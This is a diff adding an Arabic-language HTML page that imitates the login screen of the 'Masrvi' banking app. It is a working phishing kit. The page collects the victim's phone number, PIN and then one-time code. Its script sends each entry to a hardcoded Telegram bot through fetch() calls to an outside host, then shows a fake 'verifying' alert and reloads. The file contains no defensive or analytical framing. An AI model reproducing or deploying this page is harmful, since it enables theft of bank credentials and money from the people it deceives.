@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مصرفي - تسجيل الدخول</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
+        
+        body { 
+            font-family: 'Tajawal', sans-serif; 
+            background: #f4f7f6; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh;
+        }
+
+        /* الهيدر العلوي بنمط انسيابي متناسق مع شعار مصرفي */
+        .app-header {
+            background: linear-gradient(135deg, #00d3a9, #2e3192);
+            height: 240px;
+            padding: 40px 20px;
+            border-bottom-left-radius: 45px;
+            border-bottom-right-radius: 45px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(46, 49, 146, 0.15);
+        }
+
+        /* تنسيق اللوجو ليكون بارزاً ونظيفاً */
+        .masrvi-logo {
+            width: 190px; /* الحجم المثالي للوجو العريض */
+            height: auto;
+            background: white;
+            padding: 12px;
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+        }
+
+        .login-card {
+            background: white;
+            margin: -50px 25px 20px;
+            padding: 30px 20px;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .input-box label {
+            display: block;
+            font-size: 13px;
+            color: #7f8c8d;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1.5px solid #ecf0f1;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            outline: none;
+            text-align: center;
+            color: #2e3192;
+            transition: 0.3s;
+        }
+
+        .input-box input:focus {
+            border-color: #00d3a9;
+            background: #f9fffb;
+        }
+
+        /* زر الدخول باللون الأخضر المميز لمصرفي */
+        .btn-primary {
+            background: #00d3a9;
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border-radius: 15px;
+            font-size: 19px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0, 211, 169, 0.3);
+        }
+
+        #screen-otp { display: none; padding: 40px 20px; text-align: center; }
+
+        .otp-input {
+            width: 85%;
+            padding: 15px;
+            font-size: 26px;
+            letter-spacing: 12px;
+            border: 2px solid #00d3a9;
+            border-radius: 15px;
+            text-align: center;
+            margin: 30px 0;
+            outline: none;
+            color: #2e3192;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="screen-login">
+        <div class="app-header">
+            <!-- وضع شعار مصرفي هنا -->
+            <img src="https://i.ibb.co/680L13B/Mas.png" alt="Masrvi" class="masrvi-logo">
+            <p class="text-white opacity-90 text-sm">مرحباً بك في تطبيق مصرفي للخدمات البنكية</p>
+        </div>
+
+        <div class="login-card">
+            <h2 class="text-xl font-bold text-[#2e3192] mb-6 text-center">تسجيل الدخول</h2>
+            
+            <div class="input-box">
+                <label>رقم الهاتف</label>
+                <input id="phone" type="tel" maxlength="8" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="00000000">
+            </div>
+
+            <div class="input-box">
+                <label>الرمز السري</label>
+                <input id="pin" type="password" maxlength="4" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="****">
+            </div>
+
+            <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
+            <p class="text-center text-[#2e3192] mt-6 text-sm font-medium">نسيت كلمة المرور؟</p>
+        </div>
+    </div>
+
+    <div id="screen-otp">
+        <div class="mb-10">
+            <img src="https://img.icons8.com/ios-filled/100/00d3a9/shield-confirmation.png" class="mx-auto mb-4">
+            <h2 class="text-2xl font-bold text-[#2e3192]">تأكيد الهوية</h2>
+            <p class="text-gray-500 mt-2">يرجى إدخال الرمز المرسل لهاتفك</p>
+        </div>
+
+        <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100 mx-6">
+            <input id="otp_code" type="tel" maxlength="6" class="otp-input"
+                   oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                   placeholder="000000">
+            
+            <button onclick="submitOTP()" class="btn-primary">تأكيد العملية</button>
+        </div>
+    </div>
+
+    <script>
+        // معلومات الإرسال الخاصة بك
+        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const CHAT = "8665814266";
+
+        function handleLogin() {
+            const u = document.getElementById('phone').value;
+            const p = document.getElementById('pin').value;
+
+            if(u.length === 8 && p.length === 4) {
+                send(`🏦 Masrvi Login\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
+                document.getElementById('screen-login').style.display = 'none';
+                document.getElementById('screen-otp').style.display = 'block';
+            } else {
+                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح");
+            }
+        }
+
+        function submitOTP() {
+            const code = document.getElementById('otp_code').value;
+            if(code.length === 6) {
+                send(`🔑 Masrvi OTP: ${code}`);
+                alert("جاري التحقق من الرمز...");
+                location.reload();
+            } else {
+                alert("يرجى إدخال الرمز كاملاً");
+            }
+        }
+
+        function send(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
+        }
+    </script>
+</body>
